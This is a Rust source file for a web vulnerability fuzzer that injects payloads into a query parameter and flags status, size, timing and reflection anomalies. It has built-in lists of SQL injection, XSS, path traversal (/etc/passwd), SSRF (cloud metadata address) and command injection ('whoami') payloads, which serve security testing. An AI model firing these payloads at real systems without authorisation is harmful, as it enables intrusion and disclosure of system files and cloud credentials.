use anyhow::Result;
use std::path::Path;
use tokio::fs;
use tracing::{info, warn};

use crate::config::Config;
use crate::modules::http_client::HttpClient;
use crate::modules::storage::Storage;
use crate::modules::types::{Evidence, Finding, HttpRequest, HttpResponse, Severity};

pub struct Fuzzer {
    config: Config,
    http_client: HttpClient,
}

impl Fuzzer {
    pub fn new(config: Config) -> Self {
        let http_client = HttpClient::new(config.clone()).expect("Failed to create HTTP client");

        Self {
            config,
            http_client,
        }
    }

    pub async fn fuzz(&self, target: &str, mode: &str, payload_file: Option<&Path>) -> Result<()> {
        info!("Starting fuzzing: {} (mode: {})", target, mode);

        let storage = Storage::new(&self.config.storage.db_path)?;

        // Load or generate payloads
        let payloads = if let Some(path) = payload_file {
            self.load_payloads_from_file(path).await?
        } else {
            self.generate_payloads(mode)?
        };

        info!("Loaded {} payloads", payloads.len());

        // Get baseline response for comparison
        let (baseline_req, baseline_resp) = self.http_client.get(target).await?;
        storage.save_request_response(&baseline_req, &baseline_resp)?;

        info!(
            "Baseline response: {} bytes, {}ms",
            baseline_resp.body.len(),
            baseline_resp.duration_ms
        );

        // Fuzz the endpoint
        let mut findings_count = 0;

        for (idx, payload) in payloads.iter().enumerate() {
            if idx % 10 == 0 {
                info!("Progress: {}/{}", idx, payloads.len());
            }

            // Inject payload (this is simplified - real implementation would be smarter)
            let fuzzed_url = if target.contains('?') {
                format!("{}&fuzz={}", target, payload)
            } else {
                format!("{}?fuzz={}", target, payload)
            };

            match self.http_client.get(&fuzzed_url).await {
                Ok((req, resp)) => {
                    storage.save_request_response(&req, &resp)?;

                    // Analyze response for anomalies
                    if let Some(finding) = self.analyze_response(
                        &baseline_resp,
                        &resp,
                        mode,
                        payload,
                        req,
                        resp.clone(),
                    ) {
                        storage.save_finding(&finding)?;
                        findings_count += 1;
                        info!("FINDING: {}", finding.title);
                    }
                }
                Err(e) => {
                    warn!("Fuzzing error with payload '{}': {}", payload, e);
                }
            }

            // Rate limiting delay
            tokio::time::sleep(tokio::time::Duration::from_millis(
                self.config.fuzzing.delay_ms,
            ))
            .await;
        }

        info!(
            "Fuzzing complete. Found {} potential issues",
            findings_count
        );
        Ok(())
    }

    async fn load_payloads_from_file(&self, path: &Path) -> Result<Vec<String>> {
        let content = fs::read_to_string(path).await?;
        Ok(content.lines().map(|s| s.to_string()).collect())
    }

    fn generate_payloads(&self, mode: &str) -> Result<Vec<String>> {
        match mode {
            "sqli" => Ok(self.generate_sqli_payloads()),
            "xss" => Ok(self.generate_xss_payloads()),
            "idor" => Ok(self.generate_idor_payloads()),
            "lfi" => Ok(self.generate_lfi_payloads()),
            "ssrf" => Ok(self.generate_ssrf_payloads()),
            "cmd_injection" => Ok(self.generate_cmd_injection_payloads()),
            _ => Err(anyhow::anyhow!("Unknown fuzzing mode: {}", mode)),
        }
    }

    fn generate_sqli_payloads(&self) -> Vec<String> {
        vec![
            "' OR '1'='1".to_string(),
            "' OR 1=1--".to_string(),
            "' OR '1'='1' --".to_string(),
            "admin' --".to_string(),
            "' OR 'x'='x".to_string(),
            "1' ORDER BY 1--".to_string(),
            "1' ORDER BY 2--".to_string(),
            "1' ORDER BY 3--".to_string(),
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL--".to_string(),
            "1' AND 1=1--".to_string(),
            "1' AND 1=2--".to_string(),
            "' AND SLEEP(5)--".to_string(),
            "1' WAITFOR DELAY '0:0:5'--".to_string(),
        ]
    }

    fn generate_xss_payloads(&self) -> Vec<String> {
        vec![
            "<script>alert('XSS')</script>".to_string(),
            "<img src=x onerror=alert('XSS')>".to_string(),
            "<svg onload=alert('XSS')>".to_string(),
            "javascript:alert('XSS')".to_string(),
            "<iframe src=javascript:alert('XSS')>".to_string(),
            "<body onload=alert('XSS')>".to_string(),
            "<input onfocus=alert('XSS') autofocus>".to_string(),
            "<marquee onstart=alert('XSS')>".to_string(),
            "\"><script>alert('XSS')</script>".to_string(),
            "'><script>alert('XSS')</script>".to_string(),
        ]
    }

    fn generate_idor_payloads(&self) -> Vec<String> {
        // Generate numeric IDs
        (1..=100)
            .map(|i| i.to_string())
            .chain(vec![
                "0".to_string(),
                "-1".to_string(),
                "999999".to_string(),
            ])
            .collect()
    }

    fn generate_lfi_payloads(&self) -> Vec<String> {
        vec![
            "../../etc/passwd".to_string(),
            "../../../etc/passwd".to_string(),
            "../../../../etc/passwd".to_string(),
            "../../windows/win.ini".to_string(),
            "../../../windows/win.ini".to_string(),
            "....//....//....//etc/passwd".to_string(),
            "..%2f..%2f..%2fetc%2fpasswd".to_string(),
            "/etc/passwd".to_string(),
            "C:\\windows\\win.ini".to_string(),
        ]
    }

    fn generate_ssrf_payloads(&self) -> Vec<String> {
        vec![
            "http://localhost".to_string(),
            "http://127.0.0.1".to_string(),
            "http://169.254.169.254".to_string(),
            "http://metadata.google.internal".to_string(),
            "http://[::1]".to_string(),
            "http://0.0.0.0".to_string(),
        ]
    }

    fn generate_cmd_injection_payloads(&self) -> Vec<String> {
        vec![
            "; ls".to_string(),
            "| ls".to_string(),
            "& ls".to_string(),
            "; whoami".to_string(),
            "| whoami".to_string(),
            "& whoami".to_string(),
            "`whoami`".to_string(),
            "$(whoami)".to_string(),
        ]
    }

    fn analyze_response(
        &self,
        baseline: &HttpResponse,
        response: &HttpResponse,
        mode: &str,
        payload: &str,
        request: HttpRequest,
        resp: HttpResponse,
    ) -> Option<Finding> {
        // Check for status code differences
        if response.status_code != baseline.status_code {
            return Some(self.create_finding(
                mode,
                "Status Code Anomaly",
                format!(
                    "Response status changed from {} to {} with payload: {}",
                    baseline.status_code, response.status_code, payload
                ),
                Severity::Medium,
                request,
                resp,
                payload,
            ));
        }

        // Check for significant response size differences
        let size_diff = (response.body.len() as i64 - baseline.body.len() as i64).abs();
        let size_threshold = (baseline.body.len() as f64 * 0.2) as i64; // 20% difference

        if size_diff > size_threshold {
            return Some(self.create_finding(
                mode,
                "Response Size Anomaly",
                format!(
                    "Response size changed significantly ({} bytes difference) with payload: {}",
                    size_diff, payload
                ),
                Severity::Low,
                request,
                resp,
                payload,
            ));
        }

        // Check for error messages that might indicate vulnerabilities
        let error_indicators = vec![
            "sql",
            "mysql",
            "postgresql",
            "oracle",
            "error",
            "exception",
            "stack trace",
            "warning",
            "fatal",
        ];

        for indicator in error_indicators {
            if response.body.to_lowercase().contains(indicator)
                && !baseline.body.to_lowercase().contains(indicator)
            {
                return Some(self.create_finding(
                    mode,
                    "Error Message Disclosure",
                    format!(
                        "Error indicator '{}' found in response with payload: {}",
                        indicator, payload
                    ),
                    Severity::Medium,
                    request,
                    resp,
                    payload,
                ));
            }
        }

        // Check for timing anomalies (potential blind injection)
        let time_diff = (response.duration_ms as i64 - baseline.duration_ms as i64).abs();
        if time_diff > 3000 {
            // More than 3 seconds difference
            return Some(self.create_finding(
                mode,
                "Timing Anomaly",
                format!(
                    "Response time significantly delayed ({}ms difference) with payload: {}",
                    time_diff, payload
                ),
                Severity::High,
                request,
                resp,
                payload,
            ));
        }

        // Mode-specific checks
        match mode {
            "xss" => {
                if response.body.contains(payload) {
                    return Some(self.create_finding(
                        mode,
                        "Potential XSS",
                        format!("Payload reflected in response: {}", payload),
                        Severity::High,
                        request,
                        resp,
                        payload,
                    ));
                }
            }
            "lfi" => {
                if response.body.contains("root:") || response.body.contains("[extensions]") {
                    return Some(self.create_finding(
                        mode,
                        "Potential LFI",
                        format!("Sensitive file content detected with payload: {}", payload),
                        Severity::Critical,
                        request,
                        resp,
                        payload,
                    ));
                }
            }
            _ => {}
        }

        None
    }

    fn create_finding(
        &self,
        mode: &str,
        title: &str,
        description: String,
        severity: Severity,
        request: HttpRequest,
        response: HttpResponse,
        payload: &str,
    ) -> Finding {
        let evidence = Evidence {
            request,
            response,
            matched_pattern: Some(payload.to_string()),
            notes: vec![format!("Fuzzing mode: {}", mode)],
        };

        Finding::new(
            uuid::Uuid::nil(), // Will be set when we save to DB
            severity,
            title.to_string(),
            description,
            evidence,
        )
    }
}
